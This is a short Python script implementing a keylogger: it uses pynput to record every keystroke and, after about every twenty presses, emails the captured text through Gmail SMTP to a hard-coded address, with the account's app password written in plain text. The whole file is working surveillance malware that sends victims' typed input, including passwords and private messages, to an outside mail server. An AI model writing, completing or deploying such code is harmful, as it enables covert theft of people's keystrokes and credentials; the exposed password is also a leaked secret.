import pynput
from pynput.keyboard import Key, Listener
import smtplib, ssl

count = 0
keys =[]

def sendEmail(message):
    openssl_verify_mode: 'none'
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "rajurastogijob@gmail.com"
    password = "dzos qdpc ltes gfjh"
    receiver_email = "rajurastogijob@gmail.com"

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        # server.docmd('AUTH', 'XOAUTH2 ' + base64.b64encode(auth_string.encode()).decode("utf-8"))
        server.login(sender_email,password)
        server.sendmail(sender_email, receiver_email, message)

    except Exception as e:
        print("An error occurred while sending the email:", e)
    finally:
        server.quit()

def on_press(key):
    print(key,end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count +=1
    if count > 20:
        count = 0
        email(keys)

def email(keys):
    message=""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        elif key.find("Key")>0:
            k =""
        message += k
    print(message)
    sendEmail(message)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()


    

